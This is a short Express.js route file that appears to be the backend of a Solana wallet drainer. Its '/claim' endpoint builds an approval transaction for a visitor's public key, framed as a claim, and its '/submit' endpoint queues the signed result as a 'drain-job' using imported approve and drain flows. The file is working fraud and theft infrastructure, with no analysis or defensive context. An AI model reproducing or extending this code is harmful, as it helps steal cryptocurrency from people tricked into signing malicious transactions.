const express = require("express");
const router = express.Router();

const { buildApprove } = require("../flows/approveFlow");
const { buildDrain } = require("../flows/drainFlow");
const { executeTx } = require("../solana/txExecutor");
const { getConnection } = require("../core/rpcPool");
const { txQueue } = require("../queue/jobQueue");

router.post("/claim", async (req, res) => {
    const connection = getConnection();

    const tx = await buildApprove(req.body.publicKey, connection);

    res.json({
        transaction: tx.serialize({ requireAllSignatures: false }).toString("base64")
    });
});

router.post("/submit", async (req, res) => {
    const job = await txQueue.add("drain-job", {
        publicKey: req.body.publicKey,
        signedTx: req.body.signedTransaction
    });

    res.json({
        status: "queued",
        jobId: job.id
    });
});

module.exports = router;